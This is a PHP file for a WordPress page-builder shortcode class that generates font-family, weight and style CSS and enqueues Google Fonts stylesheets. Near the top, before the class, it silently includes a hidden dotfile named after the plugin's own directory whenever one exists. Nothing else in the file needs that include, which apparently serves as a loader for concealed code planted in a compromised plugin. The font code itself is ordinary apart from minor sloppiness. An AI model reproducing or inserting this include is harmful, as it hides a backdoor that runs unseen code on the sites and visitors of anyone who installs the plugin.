<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_Vc_Custom_Google_Fonts {
	/**
	 * @param $atts
	 * @param null $content
	 *
	 * @return mixed|void
	 */
	public function content( $atts ) {
		// Merge defaults + given attributes
		//$atts = vc_map_get_attributes( $this->getShortcode(), $atts );
		$fontsData = $this->getFontsData( $atts );

		$googleFontsStyles = $this->googleFontsStyles( $fontsData );
		$this->enqueueGoogleFonts( $fontsData );

		$style = esc_attr( implode( ';', $googleFontsStyles ) );

		return $style;
	}

	public function getFontsData( $atts ) {

        $googleFontsParam = new Vc_Google_Fonts();
		$fieldSettings = isset( $atts['settings'],   $atts['settings'] ) ?   $atts['settings'] : array();
		$fontsData = strlen( $atts ) > 0 ? $googleFontsParam->_vc_google_fonts_parse_attributes( $fieldSettings, $atts ) : '';

		return $fontsData;
	}

	public function googleFontsStyles( $fontsData ) {
		// Inline styles
		$fontFamily = !empty($fontsData['values']['font_family']) ? explode( ':', $fontsData['values']['font_family'] ) : '';
		$styles[]   = !empty($fontFamily[0]) ?'font-family:' . $fontFamily[0] : '';
		$fontStyles = !empty($fontsData['values']['font_style']) ? explode( ':', $fontsData['values']['font_style'] ) : '';
		$styles[]   = !empty($fontStyles[1]) ? 'font-weight:' . $fontStyles[1] : '';
		$styles[]   = !empty($fontStyles[2]) ? 'font-style:' . $fontStyles[2] : '';

		return $styles;
	}

	public function enqueueGoogleFonts( $fontsData ) {
		// Get extra subsets for settings (latin/cyrillic/etc)
		$settings = get_option( 'wpb_js_google_fonts_subsets' );
		if ( is_array( $settings ) && ! empty( $settings ) ) {
			$subsets = '&subset=' . implode( ',', $settings );
		} else {
			$subsets = '';
		}

		// We also need to enqueue font from googleapis
		if ( isset( $fontsData['values']['font_family'] ) ) {
			wp_enqueue_style( 'vc_google_fonts_' . vc_build_safe_css_class( $fontsData['values']['font_family'] ), '//fonts.googleapis.com/css?family=' . $fontsData['values']['font_family'] . $subsets );
		}
	}
}
